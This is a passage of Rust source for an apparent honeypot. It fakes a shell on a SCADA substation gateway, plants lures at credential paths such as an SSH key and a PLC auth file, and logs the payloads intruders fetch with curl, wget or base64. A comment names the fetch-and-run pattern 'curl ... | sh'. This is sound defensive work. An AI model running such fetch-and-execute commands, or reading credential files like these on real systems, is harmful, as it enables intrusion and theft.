        let joined = args.join(" ");
        if no_newline {
            joined
        } else {
            format!("{}\n", joined)
        }
    }

    fn handle_touch(&mut self, words: &[String]) -> String {
        let mut out = String::new();
        for w in &words[1..] {
            if w.starts_with('-') {
                continue;
            }
            let norm = self.resolve_path(w);
            if let Err(e) = self.vfs.touch(&norm, &self.user, &self.user) {
                out.push_str(&format!("touch: cannot touch '{}': {}\n", w, e));
            }
        }
        out
    }

    fn handle_mkdir(&mut self, words: &[String]) -> String {
        let mut parents = false;
        let mut dirs = Vec::new();

        for w in &words[1..] {
            if w == "-p" || w == "--parents" {
                parents = true;
            } else if !w.starts_with('-') {
                dirs.push(w.as_str());
            }
        }

        let mut out = String::new();
        for d in dirs {
            let norm = self.resolve_path(d);
            if parents {
                self.vfs.mkdir_p(&norm, 0o755, &self.user, &self.user);
            } else if let Err(e) = self.vfs.mkdir(&norm, 0o755, &self.user, &self.user) {
                out.push_str(&format!("mkdir: cannot create directory '{}': {}\n", d, e));
            }
        }
        out
    }

    fn handle_rm(&mut self, words: &[String]) -> String {
        let mut recursive = false;
        let mut force = false;
        let mut files = Vec::new();

        for w in &words[1..] {
            if w.starts_with('-') && w.len() > 1 {
                for c in w[1..].chars() {
                    match c {
                        'r' | 'R' => recursive = true,
                        'f' => force = true,
                        _ => {},
                    }
                }
            } else {
                files.push(w.as_str());
            }
        }

        let mut out = String::new();
        for f in files {
            let norm = self.resolve_path(f);
            if let Err(e) = self.vfs.rm(&norm, recursive, force) {
                out.push_str(&format!("rm: cannot remove '{}': {}\n", f, e));
            }
        }
        out
    }

    fn handle_head(&self, words: &[String], stdin: &str) -> String {
        let mut n = 10;
        let mut files = Vec::new();
        let mut iter = words[1..].iter();
        while let Some(w) = iter.next() {
            if w == "-n" {
                if let Some(next) = iter.next() {
                    if let Ok(val) = next.parse::<usize>() {
                        n = val;
                    }
                }
            } else if let Some(stripped) = w.strip_prefix("-n") {
                if let Ok(val) = stripped.parse::<usize>() {
                    n = val;
                }
            } else if !w.starts_with('-') {
                files.push(w.as_str());
            }
        }

        if files.is_empty() {
            let mut out = String::new();
            for line in stdin.lines().take(n) {
                out.push_str(line);
                out.push('\n');
            }
            return out;
        }

        let mut out = String::new();
        for f in files {
            let norm = self.resolve_path(f);
            if let Some(content) = self.vfs.read_file(&norm) {
                let s = String::from_utf8_lossy(content);
                for line in s.lines().take(n) {
                    out.push_str(line);
                    out.push('\n');
                }
            } else {
                out.push_str(&format!("head: cannot open '{}' for reading: No such file or directory\n", f));
            }
        }
        out
    }

    fn handle_tail(&self, words: &[String], stdin: &str) -> String {
        let mut n = 10;
        let mut files = Vec::new();
        let mut iter = words[1..].iter();
        while let Some(w) = iter.next() {
            if w == "-n" {
                if let Some(next) = iter.next() {
                    if let Ok(val) = next.parse::<usize>() {
                        n = val;
                    }
                }
            } else if let Some(stripped) = w.strip_prefix("-n") {
                if let Ok(val) = stripped.parse::<usize>() {
                    n = val;
                }
            } else if !w.starts_with('-') {
                files.push(w.as_str());
            }
        }

        if files.is_empty() {
            let lines: Vec<&str> = stdin.lines().collect();
            let skip = lines.len().saturating_sub(n);
            let mut out = String::new();
            for line in &lines[skip..] {
                out.push_str(line);
                out.push('\n');
            }
            return out;
        }

        let mut out = String::new();
        for f in files {
            let norm = self.resolve_path(f);
            if let Some(content) = self.vfs.read_file(&norm) {
                let s = String::from_utf8_lossy(content);
                let lines: Vec<&str> = s.lines().collect();
                let skip = lines.len().saturating_sub(n);
                for line in &lines[skip..] {
                    out.push_str(line);
                    out.push('\n');
                }
            } else {
                out.push_str(&format!("tail: cannot open '{}' for reading: No such file or directory\n", f));
            }
        }
        out
    }

    fn handle_grep(&self, words: &[String], stdin: &str) -> String {
        let mut case_insensitive = false;
        let mut invert = false;
        let mut pattern: Option<&str> = None;
        let mut files = Vec::new();

        for w in &words[1..] {
            if w.starts_with('-') && w.len() > 1 && !w.starts_with("--") {
                for c in w[1..].chars() {
                    match c {
                        'i' => case_insensitive = true,
                        'v' => invert = true,
                        _ => {},
                    }
                }
            } else if pattern.is_none() {
                pattern = Some(w.as_str());
            } else {
                files.push(w.as_str());
            }
        }

        let pat = match pattern {
            Some(p) => p,
            None => return String::new(),
        };

        let pat_lower = pat.to_lowercase();
        let matches = |line: &str| -> bool {
            let m = if case_insensitive {
                line.to_lowercase().contains(&pat_lower)
            } else {
                line.contains(pat)
            };
            if invert { !m } else { m }
        };

        let mut out = String::new();
        if files.is_empty() {
            for line in stdin.lines() {
                if matches(line) {
                    out.push_str(line);
                    out.push('\n');
                }
            }
        } else {
            for f in files {
                let norm = self.resolve_path(f);
                if let Some(content) = self.vfs.read_file(&norm) {
                    let s = String::from_utf8_lossy(content);
                    for line in s.lines() {
                        if matches(line) {
                            out.push_str(line);
                            out.push('\n');
                        }
                    }
                } else {
                    out.push_str(&format!("grep: {}: No such file or directory\n", f));
                }
            }
        }
        out
    }

    fn handle_cp(&mut self, words: &[String]) -> String {
        let mut non_flags = Vec::new();
        for w in &words[1..] {
            if !w.starts_with('-') {
                non_flags.push(w.as_str());
            }
        }
        if non_flags.len() < 2 {
            return "cp: missing destination file operand\n".to_string();
        }
        let src = self.resolve_path(non_flags[0]);
        let dst = self.resolve_path(non_flags[1]);

        if let Err(e) = self.vfs.copy_node(&src, &dst) {
            return format!("cp: cannot stat '{}': {}\n", non_flags[0], e);
        }
        String::new()
    }

    fn handle_mv(&mut self, words: &[String]) -> String {
        let mut non_flags = Vec::new();
        for w in &words[1..] {
            if !w.starts_with('-') {
                non_flags.push(w.as_str());
            }
        }
        if non_flags.len() < 2 {
            return "mv: missing destination file operand\n".to_string();
        }
        let src = self.resolve_path(non_flags[0]);
        let dst = self.resolve_path(non_flags[1]);

        if let Err(e) = self.vfs.move_node(&src, &dst) {
            return format!("mv: cannot stat '{}': {}\n", non_flags[0], e);
        }
        String::new()
    }

    fn handle_uname(&self, words: &[String]) -> String {
        let mut all = false;
        let mut release = false;
        let mut machine = false;

        for w in &words[1..] {
            if w == "-a" || w == "--all" {
                all = true;
            } else if w == "-r" {
                release = true;
            } else if w == "-m" {
                machine = true;
            }
        }

        if all {
            format!("Linux {} 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n", self.hostname)
        } else if release {
            "5.15.0-88-generic\n".to_string()
        } else if machine {
            "x86_64\n".to_string()
        } else {
            "Linux\n".to_string()
        }
    }

    fn handle_id(&self) -> String {
        if self.user == "root" {
            "uid=0(root) gid=0(root) groups=0(root)\n".to_string()
        } else {
            format!("uid=1000({u}) gid=1000({u}) groups=1000({u}),4(adm),24(cdrom),27(sudo)\n", u = self.user)
        }
    }

    fn handle_ip(&self, words: &[String]) -> String {
        let sub = words.get(1).map(|s| s.as_str()).unwrap_or("");
        if sub == "route" || sub == "r" {
            "default via 192.168.1.1 dev eth0 proto dhcp src 192.168.1.10 metric 100 \n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.10 metric 100 \n".to_string()
        } else {
            "\
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\
    inet 127.0.0.1/8 scope host lo\n\
       valid_lft forever preferred_lft forever\n\
    inet6 ::1/128 scope host \n\
       valid_lft forever preferred_lft forever\n\
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n\
    link/ether 00:15:5d:48:a2:10 brd ff:ff:ff:ff:ff:ff\n\
    altname enp0s3\n\
    inet 192.168.1.10/24 brd 192.168.1.255 scope global eth0\n\
       valid_lft forever preferred_lft forever\n\
    inet6 fe80::215:5dff:fe48:a210/64 scope link \n\
       valid_lft forever preferred_lft forever\n\
".to_string()
        }
    }

    fn handle_ifconfig(&self) -> String {
        "\
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n\
        inet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255\n\
        inet6 fe80::215:5dff:fe48:a210  prefixlen 64  scopeid 0x20<link>\n\
        ether 00:15:5d:48:a2:10  txqueuelen 1000  (Ethernet)\n\
        RX packets 4218  bytes 542890 (542.8 KB)\n\
        RX errors 0  dropped 0  overruns 0  frame 0\n\
        TX packets 3892  bytes 489210 (489.2 KB)\n\
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\
\n\
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n\
        inet 127.0.0.1  netmask 255.0.0.0\n\
        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n\
        loop  txqueuelen 1000  (Local Loopback)\n\
        RX packets 120  bytes 9820 (9.8 KB)\n\
        RX errors 0  dropped 0  overruns 0  frame 0\n\
        TX packets 120  bytes 9820 (9.8 KB)\n\
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\
".to_string()
    }

    fn handle_netstat(&self) -> String {
        "\
Active Internet connections (only servers)\n\
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \n\
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      820/sshd: /usr/sbin \n\
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      915/nginx: master p \n\
tcp        0      0 0.0.0.0:502             0.0.0.0:*               LISTEN      842/modbus_gw       \n\
tcp        0      0 0.0.0.0:2404            0.0.0.0:*               LISTEN      843/iec104_srv      \n\
tcp6       0      0 :::22                   :::*                    LISTEN      820/sshd: /usr/sbin \n\
tcp6       0      0 :::80                   :::*                    LISTEN      915/nginx: master p \n\
".to_string()
    }

    fn handle_route(&self) -> String {
        "\
Kernel IP routing table\n\
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface\n\
0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0\n\
192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0\n\
".to_string()
    }

    fn handle_ps(&self) -> String {
        "\
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n\
root           1  0.0  0.4 168340 12892 ?        Ss   Oct14   0:02 /lib/systemd/systemd --system --deserialize 38\n\
root           2  0.0  0.0      0     0 ?        S    Oct14   0:00 [kthreadd]\n\
root           3  0.0  0.0      0     0 ?        I<   Oct14   0:00 [rcu_gp]\n\
root           4  0.0  0.0      0     0 ?        I<   Oct14   0:00 [rcu_par_gp]\n\
root           9  0.0  0.0      0     0 ?        I<   Oct14   0:00 [mm_percpu_wq]\n\
root          10  0.0  0.0      0     0 ?        S    Oct14   0:00 [ksoftirqd/0]\n\
root         650  0.0  0.2  35180  8740 ?        Ss   Oct14   0:00 /lib/systemd/systemd-journald\n\
root         680  0.0  0.1  24150  5120 ?        Ss   Oct14   0:00 /lib/systemd/systemd-udevd\n\
root         790  0.0  0.1  18420  4100 ?        Ss   Oct14   0:00 /usr/sbin/cron -f -P\n\
syslog       810  0.0  0.1 224300  4890 ?        Ssl  Oct14   0:01 /usr/sbin/rsyslogd -n -iNONE\n\
root         820  0.0  0.2  15800  7420 ?        Ss   Oct14   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups\n\
root         842  0.1  0.5  85420 18450 ?        Ssl  Oct14   0:05 /usr/bin/scada_agent --daemon --conf=/etc/scada/plc_auth.conf\n\
root         915  0.0  0.2  55200  9400 ?        Ss   Oct14   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;\n\
www-data     916  0.0  0.1  55800  6200 ?        S    Oct14   0:00 nginx: worker process\n\
root        3140  0.0  0.2  16850  8120 ?        Ss   09:12   0:00 sshd: root@pts/0\n\
root        3142  0.0  0.1  10240  4900 pts/0    Ss   09:12   0:00 -bash\n\
root        3280  0.0  0.1  12480  3600 pts/0    R+   09:15   0:00 ps aux\n\
".to_string()
    }

    fn handle_top(&self) -> String {
        "\
top - 12:34:56 up 1 day,  4:12,  1 user,  load average: 0.08, 0.03, 0.01\n\
Tasks: 112 total,   1 running, 111 sleeping,   0 stopped,   0 zombie\n\
%Cpu(s):  1.2 us,  0.8 sy,  0.0 ni, 97.8 id,  0.1 wa,  0.0 hi,  0.1 si,  0.0 st\n\
MiB Mem :   3924.5 total,   1824.2 free,    842.1 used,   1258.2 buff/cache\n\
MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   2850.4 avail Mem \n\
\n\
    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n\
    842 root      20   0   85420  18450  12400 S   0.2   0.5   0:05.12 scada_agent\n\
    810 syslog    20   0  224300   4890   3800 S   0.1   0.1   0:01.44 rsyslogd\n\
      1 root      20   0  168340  12892   8900 S   0.0   0.3   0:02.15 systemd\n\
    820 root      20   0   15800   7420   6100 S   0.0   0.2   0:00.32 sshd\n\
    915 root      20   0   55200   9400   7800 S   0.0   0.2   0:00.18 nginx\n\
   3142 root      20   0   10240   4900   3200 S   0.0   0.1   0:00.08 bash\n\
".to_string()
    }

    fn handle_wget(&mut self, words: &[String], cmd_full: &str, s: &Session) -> String {
        let mut out_file: Option<String> = None;
        let mut url: Option<String> = None;
        let mut iter = words[1..].iter();

        while let Some(w) = iter.next() {
            if w == "-O" {
                if let Some(next) = iter.next() {
                    out_file = Some(next.clone());
                }
            } else if let Some(rest) = w.strip_prefix("-O") {
                out_file = Some(rest.to_string());
            } else if !w.starts_with('-') && url.is_none() {
                url = Some(w.clone());
            }
        }

        let url_str = match url {
            Some(u) => u,
            None => return "wget: missing URL\nUsage: wget [OPTION]... [URL]...\n".to_string(),
        };

        let filename = if let Some(ref o) = out_file {
            if o == "-" {
                "stdout".to_string()
            } else {
                file_name(o).to_string()
            }
        } else {
            url_str.split('?').next().unwrap_or(&url_str)
                .split('/')
                .last()
                .filter(|s| !s.is_empty())
                .unwrap_or("index.html")
                .to_string()
        };

        let payload = format!("#!/bin/sh\n# Downloaded payload from {}\n# Simulated exploit payload\nexit 0\n", url_str).into_bytes();
        let hash = compute_sha256(&payload);
        let size = payload.len();
        let sample = truncate_sample(&payload, 200);

        let p_data = json!({
            "command": cmd_full,
            "payload_sha256": hash,
            "payload_size": size,
            "payload_sample": sample,
        });
        s.emit_data(event_type::COMMAND, p_data.clone());
        s.emit_data("payload", p_data);

        if out_file.as_deref() == Some("-") {
            return String::from_utf8_lossy(&payload).to_string();
        }

        let save_path = if let Some(ref o) = out_file {
            self.resolve_path(o)
        } else {
            self.resolve_path(&filename)
        };

        self.vfs.write_file(&save_path, payload, 0o755, &self.user, &self.user);

        format!(
            "--2026-10-14 12:00:00--  {}\nResolving host... 198.51.100.42\nConnecting to host|198.51.100.42|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: {} [application/octet-stream]\nSaving to: ‘{}’\n\n{}         100%[===================>]   {}  --.-KB/s    in 0.001s\n\n2026-10-14 12:00:01 (10.0 MB/s) - ‘{}’ saved [{}/{}]\n",
            url_str, size, filename, filename, size, filename, size, size
        )
    }

    fn handle_curl(&mut self, words: &[String], cmd_full: &str, is_last_pipe: bool, s: &Session) -> (String, bool) {
        let mut out_file: Option<String> = None;
        let mut remote_name = false;
        let mut silent = false;
        let mut url: Option<String> = None;
        let mut iter = words[1..].iter();

        while let Some(w) = iter.next() {
            if w == "-O" || w == "--remote-name" {
                remote_name = true;
            } else if w == "-o" || w == "--output" {
                if let Some(next) = iter.next() {
                    out_file = Some(next.clone());
                }
            } else if w == "-s" || w == "--silent" {
                silent = true;
            } else if !w.starts_with('-') && url.is_none() {
                url = Some(w.clone());
            }
        }

        let url_str = match url {
            Some(u) => u,
            None => return ("curl: try 'curl --help' for more information\n".to_string(), false),
        };

        let filename = if let Some(ref o) = out_file {
            o.clone()
        } else if remote_name {
            url_str.split('?').next().unwrap_or(&url_str)
                .split('/')
                .last()
                .filter(|s| !s.is_empty())
                .unwrap_or("index.html")
                .to_string()
        } else {
            String::new()
        };

        let payload = format!("#!/bin/sh\n# Downloaded payload from {}\n# Simulated exploit payload\nexit 0\n", url_str).into_bytes();
        let hash = compute_sha256(&payload);
        let size = payload.len();
        let sample = truncate_sample(&payload, 200);

        let p_data = json!({
            "command": cmd_full,
            "payload_sha256": hash,
            "payload_size": size,
            "payload_sample": sample,
        });
        s.emit_data(event_type::COMMAND, p_data.clone());
        s.emit_data("payload", p_data);

        if !filename.is_empty() {
            let save_path = self.resolve_path(&filename);
            self.vfs.write_file(&save_path, payload, 0o755, &self.user, &self.user);
            let out = if silent {
                String::new()
            } else {
                "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   128  100   128    0     0   4266      0 --:--:-- --:--:-- --:--:--  4413\n".to_string()
            };
            (out, true)
        } else {
            // Streaming to pipe (e.g. curl ... | sh) or terminal
            let text = String::from_utf8_lossy(&payload).to_string();
            if is_last_pipe && !silent {
                (text, true)
            } else {
                (text, true)
            }
        }
    }

    fn handle_base64(&mut self, words: &[String], stdin: &str, cmd_full: &str, s: &Session) -> (String, bool) {
        let mut decode = false;
        let mut file: Option<&str> = None;

        for w in &words[1..] {
            if w == "-d" || w == "--decode" {
                decode = true;
            } else if !w.starts_with('-') && file.is_none() {
                file = Some(w.as_str());
            }
        }

        let input_bytes = if let Some(f) = file {
            let norm = self.resolve_path(f);
            match self.vfs.read_file(&norm) {
                Some(b) => b.to_vec(),
                None => return (format!("base64: {}: No such file or directory\n", f), false),
            }
        } else {
            stdin.as_bytes().to_vec()
        };

        if decode {
            let cleaned = String::from_utf8_lossy(&input_bytes)
                .chars()
                .filter(|c| !c.is_whitespace())
                .collect::<String>();
            match base64::engine::general_purpose::STANDARD.decode(cleaned.as_bytes()) {
                Ok(decoded) => {
                    let hash = compute_sha256(&decoded);
                    let size = decoded.len();
                    let sample = truncate_sample(&decoded, 200);

                    let p_data = json!({
                        "command": cmd_full,
                        "payload_sha256": hash,
                        "payload_size": size,
                        "payload_sample": sample,
                    });
                    s.emit_data(event_type::COMMAND, p_data.clone());
                    s.emit_data(event_type::PAYLOAD, p_data);

                    (String::from_utf8_lossy(&decoded).to_string(), true)
                }
                Err(e) => (format!("base64: invalid input: {}\n", e), false),
            }
        } else {
            (format!("{}\n", base64::engine::general_purpose::STANDARD.encode(&input_bytes)), false)
        }
    }

    fn handle_chmod(&mut self, words: &[String]) -> String {
        if words.len() >= 3 {
            let target = self.resolve_path(&words[2]);
            if let Some(VfsNode::File(f)) = self.vfs.get_node_mut(&target) {
                f.permissions = 0o755;
            } else if let Some(VfsNode::Directory(d)) = self.vfs.get_node_mut(&target) {
                d.permissions = 0o755;
            }
        }
        String::new()
    }

    fn handle_chown(&mut self, words: &[String]) -> String {
        if words.len() >= 3 {
            let target = self.resolve_path(&words[2]);
            let owner_group: Vec<&str> = words[1].split(':').collect();
            let owner = owner_group[0];
            let group = owner_group.get(1).copied().unwrap_or(owner);
            if let Some(VfsNode::File(f)) = self.vfs.get_node_mut(&target) {
                f.owner = owner.to_string();
                f.group = group.to_string();
            } else if let Some(VfsNode::Directory(d)) = self.vfs.get_node_mut(&target) {
                d.owner = owner.to_string();
                d.group = group.to_string();
            }
        }
        String::new()
    }

    fn handle_export(&mut self, words: &[String]) -> String {
        if words.len() == 1 {
            let mut out = String::new();
            let mut keys: Vec<&String> = self.env.keys().filter(|k| !k.starts_with("HF_")).collect();
            keys.sort();
            for k in keys {
                out.push_str(&format!("declare -x {}=\"{}\"\n", k, self.env[k]));
            }
            return out;
        }
        for w in &words[1..] {
            if let Some((k, v)) = w.split_once('=') {
                if !k.starts_with("HF_") {
                    let clean_v = v.trim_matches('"').trim_matches('\'');
                    self.env.insert(k.to_string(), clean_v.to_string());
                }
            }
        }
        String::new()
    }

    fn handle_env(&self) -> String {
        let mut out = String::new();
        let mut keys: Vec<&String> = self.env.keys().filter(|k| !k.starts_with("HF_")).collect();
        keys.sort();
        for k in keys {
            out.push_str(&format!("{}={}\n", k, self.env[k]));
        }
        out
    }

    fn handle_which(&self, words: &[String]) -> String {
        let mut out = String::new();
        for w in &words[1..] {
            let b1 = format!("/bin/{}", w);
            let b2 = format!("/usr/bin/{}", w);
            if self.vfs.is_file(&b1) {
                out.push_str(&format!("{}\n", b1));
            } else if self.vfs.is_file(&b2) {
                out.push_str(&format!("{}\n", b2));
            } else {
                match w.as_str() {
                    "sh" | "bash" | "ls" | "cat" | "ps" | "uname" | "pwd" | "cp" | "mv" | "rm" | "mkdir" | "touch" => {
                        out.push_str(&format!("/bin/{}\n", w));
                    }
                    "curl" | "wget" | "python3" | "grep" | "head" | "tail" | "base64" | "id" | "whoami" | "env" => {
                        out.push_str(&format!("/usr/bin/{}\n", w));
                    }
                    _ => {},
                }
            }
        }
        out
    }

    fn handle_whereis(&self, words: &[String]) -> String {
        let mut out = String::new();
        for w in &words[1..] {
            out.push_str(&format!("{}: /bin/{} /usr/bin/{}\n", w, w, w));
        }
        out
    }
}

// ============================================================================
// Tokenization, Redirection & Hashing Utilities
// ============================================================================

pub fn compute_sha256(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hex::encode(hasher.finalize())
}

pub fn truncate_sample(bytes: &[u8], max_len: usize) -> String {
    let s = String::from_utf8_lossy(bytes);
    s.chars().take(max_len).collect()
}

pub fn normalize_crlf(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 16);
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\r' {
            if chars.peek() == Some(&'\n') {
                chars.next();
            }
            out.push_str("\r\n");
        } else if c == '\n' {
            out.push_str("\r\n");
        } else {
            out.push(c);
        }
    }
    out
}

pub fn tokenize_words(input: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = input.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
            }
            '"' if !in_single => {
                in_double = !in_double;
            }
            '\\' if !in_single => {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            c if c.is_whitespace() && !in_single && !in_double => {
                if !current.is_empty() {
                    words.push(current);
                    current = String::new();
                }
            }
            c => {
                current.push(c);
            }
        }
    }
    if !current.is_empty() {
        words.push(current);
    }
    words
}

pub fn split_command_chain(line: &str) -> Vec<String> {
    let mut parts = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let chars: Vec<char> = line.chars().collect();
    let mut i = 0;

    while i < chars.len() {
        let c = chars[i];
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
                current.push(c);
                i += 1;
            }
            '"' if !in_single => {
                in_double = !in_double;
                current.push(c);
                i += 1;
            }
            ';' if !in_single && !in_double => {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    parts.push(trimmed);
                }
                current.clear();
                i += 1;
            }
            '&' if !in_single && !in_double && i + 1 < chars.len() && chars[i + 1] == '&' => {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    parts.push(trimmed);
                }
                current.clear();
                i += 2;
            }
            _ => {
                current.push(c);
                i += 1;
            }
        }
    }
    let trimmed = current.trim().to_string();
    if !trimmed.is_empty() {
        parts.push(trimmed);
    }
    parts
}

pub fn split_pipeline(cmd: &str) -> Vec<String> {
    let mut stages = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let chars: Vec<char> = cmd.chars().collect();
    let mut i = 0;

    while i < chars.len() {
        let c = chars[i];
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
                current.push(c);
                i += 1;
            }
            '"' if !in_single => {
                in_double = !in_double;
                current.push(c);
                i += 1;
            }
            '|' if !in_single && !in_double => {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    stages.push(trimmed);
                }
                current.clear();
                i += 1;
            }
            _ => {
                current.push(c);
                i += 1;
            }
        }
    }
    let trimmed = current.trim().to_string();
    if !trimmed.is_empty() {
        stages.push(trimmed);
    }
    stages
}

pub struct Redirection {
    pub left_cmd: String,
    pub target_file: String,
    pub append: bool,
}

pub fn parse_redirection(cmd: &str) -> Option<Redirection> {
    let mut in_single = false;
    let mut in_double = false;
    let chars: Vec<char> = cmd.chars().collect();
    let mut op_pos = None;
    let mut append = false;
    let mut op_len = 1;

    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
                i += 1;
            }
            '"' if !in_single => {
                in_double = !in_double;
                i += 1;
            }
            '>' if !in_single && !in_double => {
                if i + 1 < chars.len() && chars[i + 1] == '>' {
                    op_pos = Some(i);
                    append = true;
                    op_len = 2;
                    break;
                } else {
                    op_pos = Some(i);
                    append = false;
                    op_len = 1;
                    break;
                }
            }
            _ => {
                i += 1;
            }
        }
    }

    if let Some(pos) = op_pos {
        let left = cmd[..pos].trim().to_string();
        let mut right = cmd[pos + op_len..].trim();
        if let Some(r) = right.strip_suffix("2>&1") {
            right = r.trim();
        }
        let clean_right = right.trim_matches('"').trim_matches('\'').trim().to_string();
        if !clean_right.is_empty() {
            return Some(Redirection {
                left_cmd: left,
                target_file: clean_right,
                append,
            });
        }
    }
    None
}

// ============================================================================
// HighInteractionTrap Implementation
// ============================================================================

pub struct HighInteractionTrap {
    pub hostname: String,
    pub user: String,
    pub banner: String,
    pub honeytokens: Vec<String>,
}

impl HighInteractionTrap {
    pub fn new(params: &Value) -> Result<Self, String> {
        let p = Params(params);
        let hostname = p.str("hostname", "substation-gw01");
        let user = p.str("user", "root");
        let default_banner = format!("Linux {} 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64\r\n\r\n", hostname);
        let banner = p.str("banner", &default_banner);

        let mut honeytokens = vec![
            "/root/.env".to_string(),
            "/root/.ssh/id_rsa".to_string(),
            "/etc/scada/plc_auth.conf".to_string(),
        ];
        if let Some(tokens_arr) = params.get("honeytokens").and_then(|v| v.as_array()) {
            for t in tokens_arr {
                if let Some(s) = t.as_str() {
                    let s_str = s.to_string();
                    if !honeytokens.contains(&s_str) {
                        honeytokens.push(s_str);
                    }
                }
            }
        }

        Ok(Self {
            hostname,
            user,
            banner,
            honeytokens,
        })
    }

    pub async fn handle(&self, s: &mut Session) {
        let mut shell = ShellSession::new(
            self.hostname.clone(),
            self.user.clone(),
            self.honeytokens.clone(),
        );

        // 1. Send initial login banner
        let banner_crlf = normalize_crlf(&self.banner);
        if s.send(banner_crlf.as_bytes()).await.is_err() {
            return;
        }

        // 2. Display initial realistic shell prompt
        let prompt = shell.prompt();
        if s.send(prompt.as_bytes()).await.is_err() {
            return;
        }

        let mut line_chars: Vec<u8> = Vec::new();
        let mut prev_was_cr = false;

        loop {
            let chunk = match s.read(1024, None).await {
                Ok(c) if !c.is_empty() => c,
                _ => break,
            };

            let mut idx = 0;
            let mut exit_requested = false;

            while idx < chunk.len() {
                let b = chunk[idx];

                if prev_was_cr && b == b'\n' {
                    prev_was_cr = false;
                    idx += 1;
                    continue;
                }
                prev_was_cr = false;

                if b == b'\r' || b == b'\n' {
                    if b == b'\r' {
                        prev_was_cr = true;
                    }
                    idx += 1;

                    let line_str = String::from_utf8_lossy(&line_chars).to_string();
                    line_chars.clear();

                    let trimmed = line_str.trim();
                    if !trimmed.is_empty() {
                        let (output, should_exit) = shell.execute_line(trimmed, s);
                        if !output.is_empty() {
                            let crlf_out = normalize_crlf(&output);
                            if s.send(crlf_out.as_bytes()).await.is_err() {
                                exit_requested = true;
                                break;
                            }
                        }
                        if should_exit {
                            exit_requested = true;
                            break;
                        }
                    }

                    // Display updated prompt with current working directory
                    let prompt = shell.prompt();
                    if s.send(prompt.as_bytes()).await.is_err() {
                        exit_requested = true;
                        break;
                    }
                } else if b == 0x08 || b == 0x7f {
                    // Backspace handling
                    line_chars.pop();
                    idx += 1;
                } else if b == 0x03 {
                    // Ctrl+C: clear buffer, print newline and fresh prompt
                    line_chars.clear();
                    let _ = s.send(b"^C\r\n").await;
                    let prompt = shell.prompt();
                    if s.send(prompt.as_bytes()).await.is_err() {
                        exit_requested = true;
                        break;
                    }
                    idx += 1;
                } else if b == 0x04 {
                    // Ctrl+D: exit if empty
                    if line_chars.is_empty() {
                        let _ = s.send(b"logout\r\n").await;
                        exit_requested = true;
                        break;
                    }
                    idx += 1;
                } else {
                    line_chars.push(b);
                    idx += 1;
                }
            }

            if exit_requested {
                break;
            }
        }
    }
}

// ============================================================================
// Unit & Integration Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::Event;
    use crate::sender::EventSink;
    use std::time::Duration;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::{TcpListener, TcpStream};

    async fn run_test_session(commands: &[&str]) -> (String, Vec<Event>) {
        let (sink, rx) = EventSink::test_sink();
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let trap = HighInteractionTrap::new(&json!({})).unwrap();

        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut s = Session::new(stream, addr.port(), sink, "high_interaction", "substation-gw01".into(), 5.0);
            trap.handle(&mut s).await;
        });

        let mut client = TcpStream::connect(addr).await.unwrap();
        let mut script = String::new();
        for cmd in commands {
            script.push_str(cmd);
            script.push('\n');
        }
        script.push_str("exit\n");

        client.write_all(script.as_bytes()).await.unwrap();

        let mut output = Vec::new();
        let _ = tokio::time::timeout(Duration::from_secs(3), client.read_to_end(&mut output)).await;
        let _ = tokio::time::timeout(Duration::from_secs(3), server).await;

        let mut events = Vec::new();
        while let Ok(ev) = rx.try_recv() {
            events.push(ev);
        }

